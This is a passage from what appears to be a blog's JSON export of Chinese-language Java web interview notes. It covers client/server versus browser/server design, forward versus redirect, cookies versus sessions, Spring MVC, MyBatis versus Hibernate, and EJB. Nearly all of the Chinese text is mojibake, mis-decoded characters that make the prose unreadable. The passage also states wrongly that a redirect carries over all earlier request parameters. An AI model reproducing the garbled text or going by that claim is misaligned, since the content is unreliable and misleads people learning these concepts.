çš„è”ç³»ï¼Œè¿˜æœ‰åŒºåˆ«ã€‚C/Sæ˜¯Client/Serverçš„ç¼©å†™ã€‚æœåŠ¡å™¨é€šå¸¸é‡‡ç”¨é«˜æ€§èƒ½çš„PCã€å·¥ä½œç«™æˆ–å°å‹æœºï¼Œå¹¶é‡‡ç”¨å¤§å‹æ•°æ®åº“ç³»ç»Ÿï¼Œå¦‚Oracleã€Sybaseã€Informixæˆ– SQL Serverã€‚å®¢æˆ·ç«¯éœ€è¦å®‰è£…ä¸“ç”¨çš„å®¢æˆ·ç«¯è½¯ä»¶ã€‚B/ï¼³æ˜¯Brower/Serverçš„ç¼©å†™ï¼Œå®¢æˆ·æœºä¸Šåªè¦å®‰è£…ä¸€ä¸ªæµè§ˆå™¨ï¼ˆBrowserï¼‰ï¼Œå¦‚Netscape Navigatoræˆ–Internet Explorerï¼ŒæœåŠ¡å™¨å®‰è£…Oracleã€Sybaseã€Informixæˆ– SQL Serverç­‰æ•°æ®åº“ã€‚åœ¨è¿™ç§ç»“æ„ä¸‹ï¼Œç”¨æˆ·ç•Œé¢å®Œå…¨é€šè¿‡WWWæµè§ˆå™¨å®ç°ï¼Œä¸€éƒ¨åˆ†äº‹åŠ¡é€»è¾‘åœ¨å‰ç«¯å®ç°ï¼Œä½†æ˜¯ä¸»è¦äº‹åŠ¡é€»è¾‘åœ¨æœåŠ¡å™¨ç«¯å®ç°ã€‚æµè§ˆå™¨é€šè¿‡ï¼·eb Server åŒæ•°æ®åº“è¿›è¡Œæ•°æ®äº¤äº’ã€‚C/S ä¸ B/S åŒºåˆ«ï¼š ç¡¬ä»¶ç¯å¢ƒä¸åŒ:C/S ä¸€èˆ¬å»ºç«‹åœ¨ä¸“ç”¨çš„ç½‘ç»œä¸Š, å°èŒƒå›´é‡Œçš„ç½‘ç»œç¯å¢ƒ, å±€åŸŸç½‘ä¹‹é—´å†é€šè¿‡ä¸“é—¨æœåŠ¡å™¨æä¾›è¿æ¥å’Œæ•°æ®äº¤æ¢æœåŠ¡.B/S å»ºç«‹åœ¨å¹¿åŸŸç½‘ä¹‹ä¸Šçš„, ä¸å¿…æ˜¯ä¸“é—¨çš„ç½‘ç»œç¡¬ä»¶ç¯å¢ƒ,ä¾‹ä¸ç”µè¯ä¸Šç½‘, ç§Ÿç”¨è®¾å¤‡. ä¿¡æ¯è‡ªå·±ç®¡ç†. æœ‰æ¯”C/Sæ›´å¼ºçš„é€‚åº”èŒƒå›´, ä¸€èˆ¬åªè¦æœ‰æ“ä½œç³»ç»Ÿå’Œæµè§ˆå™¨å°±è¡Œï¼’ï¼å¯¹å®‰å…¨è¦æ±‚ä¸åŒC/S ä¸€èˆ¬é¢å‘ç›¸å¯¹å›ºå®šçš„ç”¨æˆ·ç¾¤, å¯¹ä¿¡æ¯å®‰å…¨çš„æ§åˆ¶èƒ½åŠ›å¾ˆå¼º. ä¸€èˆ¬é«˜åº¦æœºå¯†çš„ä¿¡æ¯ç³»ç»Ÿé‡‡ç”¨C/S ç»“æ„é€‚å®œ. å¯ä»¥é€šè¿‡B/Så‘å¸ƒéƒ¨åˆ†å¯å…¬å¼€ä¿¡æ¯.B/S å»ºç«‹åœ¨å¹¿åŸŸç½‘ä¹‹ä¸Š, å¯¹å®‰å…¨çš„æ§åˆ¶èƒ½åŠ›ç›¸å¯¹å¼±, å¯èƒ½é¢å‘ä¸å¯çŸ¥çš„ç”¨æˆ·ã€‚ï¼“ï¼å¯¹ç¨‹åºæ¶æ„ä¸åŒC/S ç¨‹åºå¯ä»¥æ›´åŠ æ³¨é‡æµç¨‹, å¯ä»¥å¯¹æƒé™å¤šå±‚æ¬¡æ ¡éªŒ, å¯¹ç³»ç»Ÿè¿è¡Œé€Ÿåº¦å¯ä»¥è¾ƒå°‘è€ƒè™‘.B/S å¯¹å®‰å…¨ä»¥åŠè®¿é—®é€Ÿåº¦çš„å¤šé‡çš„è€ƒè™‘, å»ºç«‹åœ¨éœ€è¦æ›´åŠ ä¼˜åŒ–çš„åŸºç¡€ä¹‹ä¸Š. æ¯”C/Sæœ‰æ›´é«˜çš„è¦æ±‚ B/Sç»“æ„çš„ç¨‹åºæ¶æ„æ˜¯å‘å±•çš„è¶‹åŠ¿, ä»MSçš„.Netç³»åˆ—çš„BizTalk 2000 Exchange 2000ç­‰, å…¨é¢æ”¯æŒç½‘ç»œçš„æ„ä»¶æ­å»ºçš„ç³»ç»Ÿ. SUN å’ŒIBMæ¨çš„JavaBean æ„ä»¶æŠ€æœ¯ç­‰,ä½¿B/Sæ›´åŠ æˆç†Ÿ.ï¼”ï¼è½¯ä»¶é‡ç”¨ä¸åŒC/S ç¨‹åºå¯ä»¥ä¸å¯é¿å…çš„æ•´ä½“æ€§è€ƒè™‘, æ„ä»¶çš„é‡ç”¨æ€§ä¸å¦‚åœ¨B/Sè¦æ±‚ä¸‹çš„æ„ä»¶çš„é‡ç”¨æ€§å¥½.B/S å¯¹çš„å¤šé‡ç»“æ„,è¦æ±‚æ„ä»¶ç›¸å¯¹ç‹¬ç«‹çš„åŠŸèƒ½. èƒ½å¤Ÿç›¸å¯¹è¾ƒå¥½çš„é‡ç”¨.å°±å…¥ä¹°æ¥çš„é¤æ¡Œå¯ä»¥å†åˆ©ç”¨,è€Œä¸æ˜¯åšåœ¨å¢™ä¸Šçš„çŸ³å¤´æ¡Œå­ï¼•ï¼ç³»ç»Ÿç»´æŠ¤ä¸åŒC/S ç¨‹åºç”±äºæ•´ä½“æ€§, å¿…é¡»æ•´ä½“è€ƒå¯Ÿ, å¤„ç†å‡ºç°çš„é—®é¢˜ä»¥åŠç³»ç»Ÿå‡çº§. å‡çº§éš¾. å¯èƒ½æ˜¯å†åšä¸€ä¸ªå…¨æ–°çš„ç³»ç»ŸB/S æ„ä»¶ç»„æˆ,æ–¹é¢æ„ä»¶ä¸ªåˆ«çš„æ›´æ¢,å®ç°ç³»ç»Ÿçš„æ— ç¼å‡çº§. ç³»ç»Ÿç»´æŠ¤å¼€é”€å‡åˆ°æœ€å°.ç”¨æˆ·ä»ç½‘ä¸Šè‡ªå·±ä¸‹è½½å®‰è£…å°±å¯ä»¥å®ç°å‡çº§.ï¼–ï¼å¤„ç†é—®é¢˜ä¸åŒC/S ç¨‹åºå¯ä»¥å¤„ç†ç”¨æˆ·é¢å›ºå®š, å¹¶ä¸”åœ¨ç›¸åŒåŒºåŸŸ, å®‰å…¨è¦æ±‚é«˜éœ€æ±‚, ä¸æ“ä½œç³»ç»Ÿç›¸å…³. åº”è¯¥éƒ½æ˜¯ç›¸åŒçš„ç³»ç»ŸB/S å»ºç«‹åœ¨å¹¿åŸŸç½‘ä¸Š, é¢å‘ä¸åŒçš„ç”¨æˆ·ç¾¤, åˆ†æ•£åœ°åŸŸ, è¿™æ˜¯C/Sæ— æ³•ä½œåˆ°çš„. ä¸æ“ä½œç³»ç»Ÿå¹³å°å…³ç³»æœ€å°.ï¼—ï¼ç”¨æˆ·æ¥å£ä¸åŒC/S å¤šæ˜¯å»ºç«‹çš„Windowå¹³å°ä¸Š,è¡¨ç°æ–¹æ³•æœ‰é™,å¯¹ç¨‹åºå‘˜æ™®éè¦æ±‚è¾ƒé«˜B/S å»ºç«‹åœ¨æµè§ˆå™¨ä¸Š, æœ‰æ›´åŠ ä¸°å¯Œå’Œç”ŸåŠ¨çš„è¡¨ç°æ–¹å¼ä¸ç”¨æˆ·äº¤æµ. å¹¶ä¸”å¤§éƒ¨åˆ†éš¾åº¦å‡ä½,å‡ä½å¼€å‘æˆæœ¬.ï¼˜ï¼ä¿¡æ¯æµä¸åŒC/S ç¨‹åºä¸€èˆ¬æ˜¯å…¸å‹çš„ä¸­å¤®é›†æƒçš„æœºæ¢°å¼å¤„ç†, äº¤äº’æ€§ç›¸å¯¹ä½B/S ä¿¡æ¯æµå‘å¯å˜åŒ–, B-B B-C B-Gç­‰ä¿¡æ¯ã€æµå‘çš„å˜åŒ–, æ›´åƒäº¤æ˜“ä¸­å¿ƒã€‚ forward å’Œredirectçš„åŒºåˆ«ï¼Ÿforwardæ˜¯æœåŠ¡å™¨è¯·æ±‚èµ„æºï¼ŒæœåŠ¡å™¨ç›´æ¥è®¿é—®ç›®æ ‡åœ°å€çš„URLï¼ŒæŠŠé‚£ä¸ªURLçš„å“åº”å†…å®¹è¯»å–è¿‡æ¥ï¼Œç„¶åæŠŠè¿™äº›å†…å®¹å†å‘ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨æ ¹æœ¬ä¸çŸ¥é“æœåŠ¡å™¨å‘é€çš„å†…å®¹æ˜¯ä»å“ªå„¿æ¥çš„ï¼Œæ‰€ä»¥å®ƒçš„åœ°å€æ ä¸­è¿˜æ˜¯åŸæ¥çš„åœ°å€ã€‚redirectå°±æ˜¯æœåŠ¡ç«¯æ ¹æ®é€»è¾‘,å‘é€ä¸€ä¸ªçŠ¶æ€ç ,å‘Šè¯‰æµè§ˆå™¨é‡æ–°å»è¯·æ±‚é‚£ä¸ªåœ°å€ï¼Œä¸€èˆ¬æ¥è¯´æµè§ˆå™¨ä¼šç”¨åˆšæ‰è¯·æ±‚çš„æ‰€æœ‰å‚æ•°é‡æ–°è¯·æ±‚ï¼Œæ‰€ä»¥session,requestå‚æ•°éƒ½å¯ä»¥è·å–ã€‚ cookie å’Œ session çš„åŒºåˆ«ï¼Ÿ1ã€cookieæ•°æ®å­˜æ”¾åœ¨å®¢æˆ·çš„æµè§ˆå™¨ä¸Šï¼Œsessionæ•°æ®æ”¾åœ¨æœåŠ¡å™¨ä¸Šã€‚ 2ã€cookieä¸æ˜¯å¾ˆå®‰å…¨ï¼Œåˆ«äººå¯ä»¥åˆ†æå­˜æ”¾åœ¨æœ¬åœ°çš„COOKIEå¹¶è¿›è¡ŒCOOKIEæ¬ºéª— è€ƒè™‘åˆ°å®‰å…¨åº”å½“ä½¿ç”¨sessionã€‚ 3ã€sessionä¼šåœ¨ä¸€å®šæ—¶é—´å†…ä¿å­˜åœ¨æœåŠ¡å™¨ä¸Šã€‚å½“è®¿é—®å¢å¤šï¼Œä¼šæ¯”è¾ƒå ç”¨ä½ æœåŠ¡å™¨çš„æ€§èƒ½ï¼Œè€ƒè™‘åˆ°å‡è½»æœåŠ¡å™¨æ€§èƒ½æ–¹é¢ï¼Œåº”å½“ä½¿ç”¨COOKIEã€‚ 4ã€å•ä¸ªcookieä¿å­˜çš„æ•°æ®ä¸èƒ½è¶…è¿‡4Kï¼Œå¾ˆå¤šæµè§ˆå™¨éƒ½é™åˆ¶ä¸€ä¸ªç«™ç‚¹æœ€å¤šä¿å­˜20ä¸ªcookieã€‚","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"MVC","slug":"MVC","date":"2020-07-13T21:43:03.000Z","updated":"2021-04-11T17:11:28.305Z","comments":true,"path":"MVC/","link":"","permalink":"https://blog.kayleh.top/MVC/","excerpt":"MVC","text":"MVC è¯·è°ˆä¸€ä¸‹Spring MVCçš„å·¥ä½œåŸç†æ˜¯æ€æ ·çš„ï¼Ÿâ‘ å®¢æˆ·ç«¯çš„æ‰€æœ‰è¯·æ±‚éƒ½äº¤ç»™å‰ç«¯æ§åˆ¶å™¨DispatcherServletæ¥å¤„ç†ï¼Œå®ƒä¼šè´Ÿè´£è°ƒç”¨ç³»ç»Ÿçš„å…¶ä»–æ¨¡å—æ¥çœŸæ­£å¤„ç†ç”¨æˆ·çš„è¯·æ±‚ã€‚â‘¡ DispatcherServletæ”¶åˆ°è¯·æ±‚åï¼Œå°†æ ¹æ®è¯·æ±‚çš„ä¿¡æ¯ï¼ˆåŒ…æ‹¬URLã€HTTPåè®®æ–¹æ³•ã€è¯·æ±‚å¤´ã€è¯·æ±‚å‚æ•°ã€Cookieç­‰ï¼‰ä»¥åŠHandlerMappingçš„é…ç½®æ‰¾åˆ°å¤„ç†è¯¥è¯·æ±‚çš„Handlerï¼ˆä»»ä½•ä¸€ä¸ªå¯¹è±¡éƒ½å¯ä»¥ä½œä¸ºè¯·æ±‚çš„Handlerï¼‰ã€‚â‘¢åœ¨è¿™ä¸ªåœ°æ–¹Springä¼šé€šè¿‡HandlerAdapterå¯¹è¯¥å¤„ç†å™¨è¿›è¡Œå°è£…ã€‚â‘£ HandlerAdapteræ˜¯ä¸€ä¸ªé€‚é…å™¨ï¼Œå®ƒç”¨ç»Ÿä¸€çš„æ¥å£å¯¹å„ç§Handlerä¸­çš„æ–¹æ³•è¿›è¡Œè°ƒç”¨ã€‚â‘¤ Handlerå®Œæˆå¯¹ç”¨æˆ·è¯·æ±‚çš„å¤„ç†åï¼Œä¼šè¿”å›ä¸€ä¸ªModelAndViewå¯¹è±¡ç»™DispatcherServletï¼ŒModelAndViewé¡¾åæ€ä¹‰ï¼ŒåŒ…å«äº†æ•°æ®æ¨¡å‹ä»¥åŠç›¸åº”çš„è§†å›¾çš„ä¿¡æ¯ã€‚â‘¥ ModelAndViewçš„è§†å›¾æ˜¯é€»è¾‘è§†å›¾ï¼ŒDispatcherServletè¿˜è¦å€ŸåŠ©ViewResolverå®Œæˆä»é€»è¾‘è§†å›¾åˆ°çœŸå®è§†å›¾å¯¹è±¡çš„è§£æå·¥ä½œã€‚â‘¦ å½“å¾—åˆ°çœŸæ­£çš„è§†å›¾å¯¹è±¡åï¼ŒDispatcherServletä¼šåˆ©ç”¨è§†å›¾å¯¹è±¡å¯¹æ¨¡å‹æ•°æ®è¿›è¡Œæ¸²æŸ“ã€‚â‘§ å®¢æˆ·ç«¯å¾—åˆ°å“åº”ï¼Œå¯èƒ½æ˜¯ä¸€ä¸ªæ™®é€šçš„HTMLé¡µé¢ï¼Œä¹Ÿå¯ä»¥æ˜¯XMLæˆ–JSONå­—ç¬¦ä¸²ï¼Œè¿˜å¯ä»¥æ˜¯ä¸€å¼ å›¾ç‰‡æˆ–è€…ä¸€ä¸ªPDFæ–‡ä»¶ã€‚ ç®€è¿°ä¸€ä¸‹SpringMVCçš„è¿è¡Œæœºåˆ¶ï¼Ÿä»¥åŠè¿è¡Œæœºåˆ¶çš„æµç¨‹æ˜¯ä»€ä¹ˆï¼Ÿ1ã€ç”¨æˆ·å‘é€è¯·æ±‚æ—¶ä¼šå…ˆä»DispathcherServlerçš„doServiceæ–¹æ³•å¼€å§‹ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­ä¼šå°†ApplicationContextã€localeResolverã€themeResolverç­‰å¯¹è±¡æ·»åŠ åˆ°requestä¸­ï¼Œç´§æ¥ç€å°±æ˜¯è°ƒç”¨doDispatchæ–¹æ³•ã€‚ 2ã€è¿›å…¥è¯¥æ–¹æ³•åé¦–å…ˆä¼šæ£€æŸ¥è¯¥è¯·æ±‚æ˜¯å¦æ˜¯æ–‡ä»¶ä¸Šä¼ çš„è¯·æ±‚(æ ¡éªŒçš„è§„åˆ™æ˜¯æ˜¯å¦æ˜¯postå¹¶ä¸”contenttTypeæ˜¯å¦ä¸ºmultipart/ä¸ºå‰ç¼€)å³è°ƒç”¨çš„æ˜¯checkMultipartæ–¹æ³•ï¼›å¦‚æœæ˜¯çš„å°†requeståŒ…è£…æˆMultipartHttpServletRequestã€‚ 3ã€ç„¶åè°ƒç”¨getHandleræ–¹æ³•æ¥åŒ¹é…æ¯ä¸ªHandlerMappingå¯¹è±¡ï¼Œå¦‚æœåŒ¹é…æˆåŠŸä¼šè¿”å›è¿™ä¸ªHandleçš„å¤„ç†é“¾HandlerExecutionChainå¯¹è±¡ï¼Œåœ¨è·å–è¯¥å¯¹è±¡çš„å†…éƒ¨å…¶å®ä¹Ÿè·å–æˆ‘ä»¬è‡ªå®šå®šä¹‰çš„æ‹¦æˆªå™¨ï¼Œå¹¶æ‰§è¡Œäº†å…¶ä¸­çš„æ–¹æ³•ã€‚ 4ã€æ‰§è¡Œæ‹¦æˆªå™¨çš„preHandleæ–¹æ³•ï¼Œå¦‚æœè¿”å›falseæ‰§è¡ŒafterCompletionæ–¹æ³•å¹¶ç†è§£è¿”å› 5ã€é€šè¿‡ä¸Šè¿°è·å–åˆ°äº†HandlerExecutionChainå¯¹è±¡ï¼Œé€šè¿‡è¯¥å¯¹è±¡çš„getHandler()æ–¹æ³•è·å¾—ä¸€ä¸ªobjecté€šè¿‡HandlerAdapterè¿›è¡Œå°è£…å¾—åˆ°HandlerAdapterå¯¹è±¡ã€‚ 6ã€è¯¥å¯¹è±¡è°ƒç”¨handleæ–¹æ³•æ¥æ‰§è¡ŒControllerä¸­çš„æ–¹æ³•ï¼Œè¯¥å¯¹è±¡å¦‚æœè¿”å›ä¸€ä¸ªModelAndViewç»™DispatcherServletã€‚ 7ã€DispatcherServletå€ŸåŠ©ViewResolverå®Œæˆé€»è¾‘è¯•å›¾ååˆ°çœŸå®è§†å›¾å¯¹è±¡çš„è§£æï¼Œå¾—åˆ°ViewåDispatcherServletä½¿ç”¨è¿™ä¸ªViewå¯¹ModelAndViewä¸­çš„æ¨¡å‹æ•°æ®è¿›è¡Œè§†å›¾æ¸²æŸ“ã€‚ è¯´æ˜ä¸€ä¸‹springmvcå’Œspring-bootåŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿæ€»çš„æ¥è¯´ï¼ŒSpring å°±åƒä¸€ä¸ªå¤§å®¶æ—ï¼Œæœ‰ä¼—å¤šè¡ç”Ÿäº§å“ä¾‹å¦‚ Bootï¼ŒSecurityï¼ŒJPAç­‰ç­‰ã€‚ä½†ä»–ä»¬çš„åŸºç¡€éƒ½æ˜¯Spring çš„ IOC å’Œ AOPï¼ŒIOCæä¾›äº†ä¾èµ–æ³¨å…¥çš„å®¹å™¨ï¼Œè€ŒAOPè§£å†³äº†é¢å‘åˆ‡é¢çš„ç¼–ç¨‹ï¼Œç„¶ååœ¨æ­¤ä¸¤è€…çš„åŸºç¡€ä¸Šå®ç°äº†å…¶ä»–è¡ç”Ÿäº§å“çš„é«˜çº§åŠŸèƒ½ï¼›å› ä¸º Spring çš„é…ç½®éå¸¸å¤æ‚ï¼Œå„ç§xmlï¼Œpropertieså¤„ç†èµ·æ¥æ¯”è¾ƒç¹çã€‚äºæ˜¯ä¸ºäº†ç®€åŒ–å¼€å‘è€…çš„ä½¿ç”¨ï¼ŒSpringç¤¾åŒºåˆ›é€ æ€§åœ°æ¨å‡ºäº†Spring Bootï¼Œå®ƒéµå¾ªçº¦å®šä¼˜äºé…ç½®ï¼Œæå¤§é™ä½äº†Springä½¿ç”¨é—¨æ§›ï¼Œä½†åˆä¸å¤±SpringåŸæœ¬çµæ´»å¼ºå¤§çš„åŠŸèƒ½ã€‚ è¯´æ˜ä¸€ä¸‹Spring MVCæ³¨è§£çš„ä¼˜ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ1ã€XMLé…ç½®èµ·æ¥æœ‰æ—¶å€™å†—é•¿ï¼Œæ­¤æ—¶æ³¨è§£å¯èƒ½æ˜¯æ›´å¥½çš„é€‰æ‹©ï¼Œå¦‚jpaçš„å®ä½“æ˜ å°„ï¼›æ³¨è§£åœ¨å¤„ç†ä¸€äº›ä¸å˜çš„å…ƒæ•°æ®æ—¶æœ‰æ—¶å€™æ¯”XMLæ–¹ä¾¿çš„å¤šï¼Œæ¯”å¦‚springmvcçš„æ•°æ®ç»‘å®šï¼Œå¦‚æœç”¨xmlå†™çš„ä»£ç ä¼šå¤šçš„å¤šï¼› 2ã€æ³¨è§£æœ€å¤§çš„å¥½å¤„å°±æ˜¯ç®€åŒ–äº†XMLé…ç½®ï¼›å…¶å®å¤§éƒ¨åˆ†æ³¨è§£ä¸€å®šç¡®å®šåå¾ˆå°‘ä¼šæ”¹å˜ï¼Œæ‰€ä»¥åœ¨ä¸€äº›ä¸­å°é¡¹ç›®ä¸­ä½¿ç”¨æ³¨è§£åè€Œæä¾›äº†å¼€å‘æ•ˆç‡ï¼Œæ‰€ä»¥æ²¡å¿…è¦ä¸€å¤´èµ°åˆ°é»‘ï¼› 3ã€æ³¨è§£ç›¸å¯¹äºXMLçš„å¦ä¸€ä¸ªå¥½å¤„æ˜¯ç±»å‹å®‰å…¨çš„ï¼ŒXMLåªèƒ½åœ¨è¿è¡ŒæœŸæ‰èƒ½å‘ç°é—®é¢˜ã€‚ è¯·ç®€å•ä»‹ç»ä¸€ä¸‹ä½ äº†è§£çš„Javaé¢†åŸŸä¸­çš„Web Serviceæ¡†æ¶éƒ½æœ‰å“ªäº›ï¼ŸJavaé¢†åŸŸçš„Web Serviceæ¡†æ¶å¾ˆå¤šï¼ŒåŒ…æ‹¬Axis2ï¼ˆAxisçš„å‡çº§ç‰ˆæœ¬ï¼‰ã€Jerseyï¼ˆRESTfulçš„Web Serviceæ¡†æ¶ï¼‰ã€CXFï¼ˆXFireçš„å»¶ç»­ç‰ˆæœ¬ï¼‰ã€Hessianã€Turmericã€JBoss SOAç­‰ï¼Œå…¶ä¸­ç»å¤§å¤šæ•°éƒ½æ˜¯å¼€æºæ¡†æ¶ã€‚ ç®€è¿°ä¸€ä¸‹Mybatiså’ŒHibernateçš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ1ã€ç®€ä»‹ Hibernateï¼šHibernateæ˜¯å½“å‰æœ€æµè¡Œçš„ORMæ¡†æ¶ä¹‹ä¸€ï¼Œå¯¹JDBCæä¾›äº†è¾ƒä¸ºå®Œæ•´çš„å°è£…ã€‚Hibernateçš„O/R Mappingå®ç°äº†POJO å’Œæ•°æ®åº“è¡¨ä¹‹é—´çš„æ˜ å°„ï¼Œä»¥åŠSQLçš„è‡ªåŠ¨ç”Ÿæˆå’Œæ‰§è¡Œã€‚ Mybatisï¼šMybatisåŒæ ·ä¹Ÿæ˜¯éå¸¸æµè¡Œçš„ORMæ¡†æ¶ï¼Œä¸»è¦ç€åŠ›ç‚¹åœ¨äº POJO ä¸ SQL ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚ç„¶åé€šè¿‡æ˜ å°„é…ç½®æ–‡ä»¶ï¼Œå°†SQLæ‰€éœ€çš„å‚æ•°ï¼Œä»¥åŠè¿”å›çš„ç»“æœå­—æ®µæ˜ å°„åˆ°æŒ‡å®š POJO ã€‚ç›¸å¯¹Hibernateâ€œO/Râ€è€Œè¨€ï¼ŒMybatis æ˜¯ä¸€ç§â€œSql Mappingâ€çš„ORMå®ç°ã€‚ 2ã€ç¼“å­˜æœºåˆ¶å¯¹æ¯” ç›¸åŒç‚¹ Hibernateå’ŒMybatisçš„äºŒçº§ç¼“å­˜é™¤äº†é‡‡ç”¨ç³»ç»Ÿé»˜è®¤çš„ç¼“å­˜æœºåˆ¶å¤–ï¼Œéƒ½å¯ä»¥é€šè¿‡å®ç°ä½ è‡ªå·±çš„ç¼“å­˜æˆ–ä¸ºå…¶ä»–ç¬¬ä¸‰æ–¹ç¼“å­˜æ–¹æ¡ˆï¼Œåˆ›å»ºé€‚é…å™¨æ¥å®Œå…¨è¦†ç›–ç¼“å­˜è¡Œä¸ºã€‚ ä¸åŒç‚¹ Hibernateçš„äºŒçº§ç¼“å­˜é…ç½®åœ¨SessionFactoryç”Ÿæˆçš„é…ç½®æ–‡ä»¶ä¸­è¿›è¡Œè¯¦ç»†é…ç½®ï¼Œç„¶åå†åœ¨å…·ä½“çš„è¡¨-å¯¹è±¡æ˜ å°„ä¸­é…ç½®æ˜¯é‚£ç§ç¼“å­˜ã€‚ MyBatisçš„äºŒçº§ç¼“å­˜é…ç½®éƒ½æ˜¯åœ¨æ¯ä¸ªå…·ä½“çš„è¡¨-å¯¹è±¡æ˜ å°„ä¸­è¿›è¡Œè¯¦ç»†é…ç½®ï¼Œè¿™æ ·é’ˆå¯¹ä¸åŒçš„è¡¨å¯ä»¥è‡ªå®šä¹‰ä¸åŒçš„ç¼“å­˜æœºåˆ¶ã€‚å¹¶ä¸”Mybatiså¯ä»¥åœ¨å‘½åç©ºé—´ä¸­å…±äº«ç›¸åŒçš„ç¼“å­˜é…ç½®å’Œå®ä¾‹ï¼Œé€šè¿‡Cache-refæ¥å®ç°ã€‚ ä¸¤è€…æ¯”è¾ƒ å› ä¸ºHibernateå¯¹æŸ¥è¯¢å¯¹è±¡æœ‰ç€è‰¯å¥½çš„ç®¡ç†æœºåˆ¶ï¼Œç”¨æˆ·æ— éœ€å…³å¿ƒSQLã€‚æ‰€ä»¥åœ¨ä½¿ç”¨äºŒçº§ç¼“å­˜æ—¶å¦‚æœå‡ºç°è„æ•°æ®ï¼Œç³»ç»Ÿä¼šæŠ¥å‡ºé”™è¯¯å¹¶æç¤ºã€‚è€ŒMyBatisåœ¨è¿™ä¸€æ–¹é¢ï¼Œä½¿ç”¨äºŒçº§ç¼“å­˜æ—¶éœ€è¦ç‰¹åˆ«å°å¿ƒã€‚å¦‚æœä¸èƒ½å®Œå…¨ç¡®å®šæ•°æ®æ›´æ–°æ“ä½œçš„æ³¢åŠèŒƒå›´ï¼Œé¿å…Cacheçš„ç›²ç›®ä½¿ç”¨ã€‚å¦åˆ™ï¼Œè„æ•°æ®çš„å‡ºç°ä¼šç»™ç³»ç»Ÿçš„æ­£å¸¸è¿è¡Œå¸¦æ¥å¾ˆå¤§çš„éšæ‚£ã€‚ Mybatisï¼šå°å·§ã€æ–¹ä¾¿ã€é«˜æ•ˆã€ç®€å•ã€ç›´æ¥ã€åŠè‡ªåŠ¨åŒ– Hibernateï¼šå¼ºå¤§ã€æ–¹ä¾¿ã€é«˜æ•ˆã€å¤æ‚ã€é—´æ¥ã€å…¨è‡ªåŠ¨åŒ– è¯·é—®EJBéœ€è¦ç›´æ¥å®ç°å®ƒçš„ä¸šåŠ¡æ¥å£æˆ–è€…Homeæ¥å£å—ï¼Ÿè¯·ç®€è¿°ä¸€ä¸‹ç†ç”±ã€‚ åœ¨EJBä¸­åˆ™è‡³å°‘è¦åŒ…æ‹¬10ä¸ªclass:Beanç±»ï¼Œç‰¹å®šApp Serverçš„Beanå®ç°ç±»Beançš„remoteæ¥å£ï¼Œç‰¹å®šApp Serverçš„remoteæ¥å£å®ç°ç±»ï¼Œç‰¹å®šApp Serverçš„remoteæ¥å£çš„å®ç°ç±»çš„stubç±»å’Œskeletonç±»ã€‚Beançš„homeæ¥å£ï¼Œç‰¹å®šApp Serverçš„homeæ¥å£å®ç°ç±»ï¼Œç‰¹å®šApp Serverçš„homeæ¥å£çš„å®ç°ç±»çš„stubç±»å’Œskeletonç±»ã€‚å’ŒRMIä¸åŒçš„æ˜¯ï¼ŒEJBä¸­è¿™10ä¸ªclassçœŸæ­£éœ€è¦ç”¨æˆ·å†™çš„åªæœ‰3ä¸ªï¼ŒBeanç±»ï¼Œremoteæ¥å£ï¼Œhomeæ¥å£ï¼Œå…¶å®ƒçš„7ä¸ªç©¶ç«Ÿæ€ä¹ˆç”Ÿæˆï¼Œè¢«æ‰“åŒ…åœ¨å“ªé‡Œï¼Œæ˜¯å¦éœ€è¦æ›´å¤šçš„ç±»æ–‡ä»¶ï¼Œå¦æ ¹æ®ä¸åŒçš„App Serverè¡¨ç°å‡ºè¾ƒå¤§çš„å·®å¼‚ã€‚Weblogicï¼šhomeæ¥å£å’Œremoteæ¥å£çš„weblogicçš„å®ç°ç±»çš„stubç±»å’Œskeletonç±»æ˜¯åœ¨EJBè¢«éƒ¨ç½²åˆ°weblogicçš„æ—¶å€™ï¼Œç”±weblogicåŠ¨æ€ç”Ÿæˆstubç±»å’Œskeletonç±»çš„å­—èŠ‚ç ï¼Œæ‰€ä»¥çœ‹ä¸åˆ°è¿™4ä¸ªç±»æ–‡ä»¶ã€‚å¯¹äºä¸€æ¬¡å®¢æˆ·ç«¯è¿œç¨‹è°ƒç”¨EJBï¼Œè¦ç»è¿‡ä¸¤ä¸ªè¿œç¨‹å¯¹è±¡çš„å¤šæ¬¡RMIå¾ªç¯ã€‚é¦–å…ˆæ˜¯é€šè¿‡JNDIæŸ¥æ‰¾Homeæ¥å£ï¼Œè·å¾—Homeæ¥å£çš„å®ç°ç±»ï¼Œè¿™ä¸ªè¿‡ç¨‹å…¶å®ç›¸å½“å¤æ‚ï¼Œé¦–å…ˆæ˜¯æ‰¾åˆ°Homeæ¥å£çš„Weblogicå®ç°ç±»ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªHomeæ¥å£çš„Weblogicå®ç°ç±»çš„stubç±»çš„å¯¹è±¡å®ä¾‹ï¼Œå°†å®ƒåºåˆ—åŒ–ä¼ é€ç»™å®¢æˆ·ç«¯ï¼ˆæ³¨æ„stubç±»çš„å®ä¾‹æ˜¯åœ¨ç¬¬1æ¬¡RMIå¾ªç¯ä¸­ï¼Œç”±æœåŠ¡å™¨åŠ¨æ€å‘é€ç»™å®¢æˆ·ç«¯çš„ï¼Œå› æ­¤ä¸éœ€è¦å®¢æˆ·ç«¯ä¿å­˜Homeæ¥å£çš„Weblogicå®ç°ç±»çš„stub ç±»ï¼‰ï¼Œæœ€åå®¢æˆ·ç«¯è·å¾—è¯¥stubç±»çš„å¯¹è±¡å®ä¾‹ï¼ˆæ™®é€šçš„RMIéœ€è¦åœ¨å®¢æˆ·ç«¯ä¿å­˜stubç±»ï¼Œè€ŒEJBä¸éœ€è¦ï¼Œå› ä¸ºæœåŠ¡å™¨ä¼šæŠŠstubç±»çš„å¯¹è±¡å®ä¾‹å‘é€ç»™å®¢æˆ·ç«¯ï¼‰ã€‚å®¢æˆ·ç«¯æ‹¿åˆ°æœåŠ¡å™¨ç»™å®ƒçš„Homeæ¥å£çš„Weblogicå®ç°ç±»çš„stubç±»å¯¹è±¡å®ä¾‹ä»¥åï¼Œè°ƒç”¨stubç±»çš„createæ–¹æ³•ï¼Œ (åœ¨ä»£ç 